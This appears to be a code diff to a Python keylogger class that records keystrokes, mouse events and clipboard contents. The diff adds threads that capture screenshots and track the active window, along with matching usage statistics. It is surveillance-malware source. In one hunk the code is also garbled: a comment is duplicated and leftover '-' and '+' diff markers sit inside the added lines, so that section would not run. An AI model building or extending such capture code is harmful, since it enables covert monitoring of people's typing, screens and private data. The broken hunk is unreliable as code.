@@ -33,6 +33,13 @@ except Exception as e:
     logging.warning(f"WindowMonitor import failed: {e}")
     WindowMonitor = None
 
+# Import utilities (Screenshot Monitor)
+try:
+    from utils.screenshot_monitor import ScreenshotMonitor
+except Exception as e:
+    logging.warning(f"ScreenshotMonitor import failed: {e}")
+    ScreenshotMonitor = None
+
 logger = logging.getLogger(__name__)
 
 
@@ -70,10 +77,13 @@ class KeyloggerCore:
         self.mouse_listener = None
         self.clipboard_listener = None
         self.window_monitor = None
+        self.screenshot_monitor = None
         
         # Threading
         self.main_thread = None
         self.stop_event = threading.Event()
+        self.window_thread = None
+        self.screenshot_thread = None
         
         # Statistics
         self.stats = {
@@ -188,8 +198,30 @@ class KeyloggerCore:
                     logger.info("Window monitor initialized")
                 except Exception as e:
                     logger.error(f"Failed to initialize window monitor: {e}")
-        except Exception as e:
-            logger.error(f"Error initializing utilities: {e}")
+
+            # Initialize screenshot monitor if enabled
+            # Initialize screenshot monitor if enabled
+            -            shots_enabled = self.config_manager.get('features.screenshots', False)
+            -            if shots_enabled and ScreenshotMonitor is not None:
+            -                try:
+            -                    self.screenshot_monitor = ScreenshotMonitor(self)
+            -                    logger.info("Screenshot monitor initialized")
+            -                except Exception as e:
+            -                    logger.error(f"Failed to initialize screenshot monitor: {e}")
+            +            # Support multiple configuration keys for enabling screenshots
+            +            shots_enabled = bool(
+            +                self.config_manager.get('features.screenshots', False) or
+            +                self.config_manager.get('features.screenshot_capture', False) or
+            +                self.config_manager.get('screenshots.enabled', False)
+            +            )
+            +            if shots_enabled and ScreenshotMonitor is not None:
+            +                try:
+            +                    self.screenshot_monitor = ScreenshotMonitor(self)
+            +                    logger.info("Screenshot monitor initialized")
+            +                except Exception as e:
+            +                    logger.error(f"Failed to initialize screenshot monitor: {e}")
+            except Exception as e:
+                logger.error(f"Error initializing utilities: {e}")
     
     def start(self) -> bool:
         """Start the keylogger."""
@@ -208,8 +240,14 @@ class KeyloggerCore:
             # Set up signal handlers
             self._setup_signal_handlers()
             
+            # Ensure stop flag is cleared before starting threads
+            self.stop_event.clear()
+            
             # Start listeners
             self._start_listeners()
+            
+            # Start utility monitors (e.g., window, screenshots)
+            self._start_utilities()
             
             # Update state
             self._is_running = True
@@ -272,6 +310,21 @@ class KeyloggerCore:
         except Exception as e:
             logger.error(f"Error starting listeners: {e}")
             self.stats['errors'] += 1
+
+    def _start_utilities(self) -> None:
+        """Start background utility monitors (window tracking, screenshots)."""
+        try:
+            if self.window_monitor and (self.window_thread is None or not self.window_thread.is_alive()):
+                self.window_thread = threading.Thread(target=self.window_monitor.run, name="WindowMonitorThread", daemon=True)
+                self.window_thread.start()
+                logger.info("Window monitor thread started")
+            
+            if self.screenshot_monitor and (self.screenshot_thread is None or not self.screenshot_thread.is_alive()):
+                self.screenshot_thread = threading.Thread(target=self.screenshot_monitor.run, name="ScreenshotMonitorThread", daemon=True)
+                self.screenshot_thread.start()
+                logger.info("Screenshot monitor thread started")
+        except Exception as e:
+            logger.error(f"Error starting utility monitors: {e}")
     
     def stop(self) -> bool:
         """Stop the keylogger."""
@@ -288,6 +341,9 @@ class KeyloggerCore:
             
             # Stop listeners
             self._stop_listeners()
+
+            # Stop utility monitors
+            self._stop_utilities()
             
             # Log shutdown event
             uptime = time.time() - self.start_time if self.start_time else 0
@@ -307,7 +363,7 @@ class KeyloggerCore:
         except Exception as e:
             logger.error(f"Error stopping keylogger: {e}")
             return False
-    
+
     def _stop_listeners(self) -> None:
         """Stop all listeners."""
         try:
@@ -325,6 +381,24 @@ class KeyloggerCore:
                 
         except Exception as e:
             logger.error(f"Error stopping listeners: {e}")
+
+    def _stop_utilities(self) -> None:
+        """Stop background utility monitors and wait for their threads to finish."""
+        try:
+            # Hint the screenshot monitor to exit immediately
+            if self.screenshot_monitor is not None:
+                try:
+                    self.screenshot_monitor.is_running = False
+                except Exception:
+                    pass
+            
+            # Join threads briefly (they watch stop_event to terminate)
+            if self.window_thread and self.window_thread.is_alive():
+                self.window_thread.join(timeout=2.0)
+            if self.screenshot_thread and self.screenshot_thread.is_alive():
+                self.screenshot_thread.join(timeout=2.0)
+        except Exception as e:
+            logger.error(f"Error stopping utility monitors: {e}")
     
     def is_running(self) -> bool:
         """Return whether the keylogger is currently running."""
@@ -399,6 +473,27 @@ class KeyloggerCore:
             logger.debug(f"Error getting window info: {e}")
             return "Unknown Window"
     
+    def update_active_window(self, window_name: str, process_name: Optional[str] = None) -> None:
+        """Update session stats with the currently active window.
+        Called by WindowMonitor when a window change is detected.
+        """
+        try:
+            prev_window = self.session_stats.get('active_window')
+            # Normalize and assign
+            new_window = window_name or 'Unknown'
+            if new_window != prev_window:
+                # Count only real changes
+                try:
+                    self.session_stats['window_changes'] = int(self.session_stats.get('window_changes', 0)) + 1
+                except Exception:
+                    self.session_stats['window_changes'] = 1
+            self.session_stats['active_window'] = new_window
+            if process_name:
+                self.session_stats['active_application'] = process_name
+            # Update last activity time on any window update
+            self.session_stats['last_activity_time'] = time.time()
+        except Exception as e:
+            logger.debug(f"Failed to update active window: {e}")
     def get_stats(self) -> Dict[str, Any]:
         """Get keylogger statistics as a flat dictionary (backward compatible)."""
         try:
@@ -429,7 +524,11 @@ class KeyloggerCore:
                 'keyboard_events': int(self.stats.get('keyboard_events', 0)),
                 'mouse_events': int(self.stats.get('mouse_events', 0)),
                 'clipboard_events': int(self.stats.get('clipboard_events', 0)),
-                'errors': int(self.stats.get('errors', 0))
+                'errors': int(self.stats.get('errors', 0)),
+                'active_window': self.session_stats.get('active_window', 'Unknown'),
+                'active_application': self.session_stats.get('active_application', 'Unknown'),
+                'window_changes': int(self.session_stats.get('window_changes', 0)),
+                'last_activity_time': self.session_stats.get('last_activity_time')
             }
         except Exception as e:
             logger.error(f"Error getting session stats: {e}")
